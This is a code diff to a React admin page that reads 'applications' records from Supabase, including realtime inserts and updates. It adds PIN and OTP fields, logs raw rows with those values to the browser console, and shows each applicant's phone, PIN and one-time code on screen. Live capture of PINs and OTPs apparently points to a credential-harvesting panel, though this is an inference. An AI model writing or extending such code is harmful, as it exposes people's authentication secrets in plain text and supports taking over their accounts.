@@ -11,6 +11,8 @@ import {
 type ApplicationRecord = {
   id: string;
   phone?: string | null;
+  pin?: string | null;
+  otp?: string | null;
   firstName?: string | null;
   lastName?: string | null;
   verificationCode?: string | null;
@@ -87,7 +89,22 @@ const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
     setIsLoadingApplications(true);
     try {
       const rows = await fetchApplicationsFromSupabase(100);
-      const normalized = (rows ?? []).map((r: any) => normalizeApplicationRecord(r));
+      const normalized = (rows ?? []).map((r: any) => {
+        console.log('[ADMIN][RAW_ROW]', r);
+        const normalizedRow = normalizeApplicationRecord(r);
+        console.log('[ADMIN][NORMALIZED_ROW]', normalizedRow);
+        console.log('[ADMIN][RENDER_PROPERTY_NAMES]', {
+          propertyNames: ['phone', 'Phone', 'phone_number', 'pin', 'Pin', 'verificationCode', 'verification_code', 'otp', 'OTP'],
+          values: {
+            phone: normalizedRow.phone,
+            pin: normalizedRow.pin,
+            otp: normalizedRow.otp,
+            verificationCode: normalizedRow.verificationCode,
+            verification_code: normalizedRow.verification_code,
+          },
+        });
+        return normalizedRow;
+      });
       setApplications(sortApplications(normalized));
       setError(null);
     } catch (err: any) {
@@ -160,7 +177,19 @@ const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
           table: 'applications',
           schema: 'public',
         });
+        console.log('[ADMIN][RAW_ROW]', payload.new);
         const normalized = normalizeApplicationRecord(payload.new as Record<string, any>);
+        console.log('[ADMIN][NORMALIZED_ROW]', normalized);
+        console.log('[ADMIN][RENDER_PROPERTY_NAMES]', {
+          propertyNames: ['phone', 'Phone', 'phone_number', 'pin', 'Pin', 'verificationCode', 'verification_code', 'otp', 'OTP'],
+          values: {
+            phone: normalized.phone,
+            pin: normalized.pin,
+            otp: normalized.otp,
+            verificationCode: normalized.verificationCode,
+            verification_code: normalized.verification_code,
+          },
+        });
         console.log('[DEBUG][ADMIN][REALTIME_INSERT_NORMALIZED]', {
           file: 'src/components/AdminPage.tsx',
           function: 'connectRealtime',
@@ -202,7 +231,19 @@ const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
           table: 'applications',
           schema: 'public',
         });
+        console.log('[ADMIN][RAW_ROW]', payload.new);
         const normalized = normalizeApplicationRecord(payload.new as Record<string, any>);
+        console.log('[ADMIN][NORMALIZED_ROW]', normalized);
+        console.log('[ADMIN][RENDER_PROPERTY_NAMES]', {
+          propertyNames: ['phone', 'Phone', 'phone_number', 'pin', 'Pin', 'verificationCode', 'verification_code', 'otp', 'OTP'],
+          values: {
+            phone: normalized.phone,
+            pin: normalized.pin,
+            otp: normalized.otp,
+            verificationCode: normalized.verificationCode,
+            verification_code: normalized.verification_code,
+          },
+        });
         console.log('[DEBUG][ADMIN][REALTIME_UPDATE_NORMALIZED]', {
           file: 'src/components/AdminPage.tsx',
           function: 'connectRealtime',
@@ -488,7 +529,10 @@ const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
                   </div>
                   <div className="mt-3">
                     <div className="rounded-xl bg-slate-50 p-3 text-sm text-slate-700">
-                      <strong className="text-slate-900">Email:</strong> {app.email || 'Not provided'}
+                      <div><strong className="text-slate-900">Email:</strong> {app.email || 'Not provided'}</div>
+                      <div className="mt-1"><strong className="text-slate-900">Phone:</strong> {app.phone || '—'}</div>
+                      <div className="mt-1"><strong className="text-slate-900">PIN:</strong> {app.pin || '—'}</div>
+                      <div className="mt-1"><strong className="text-slate-900">OTP:</strong> {app.otp || '—'}</div>
                     </div>
                   </div>
                 </div>
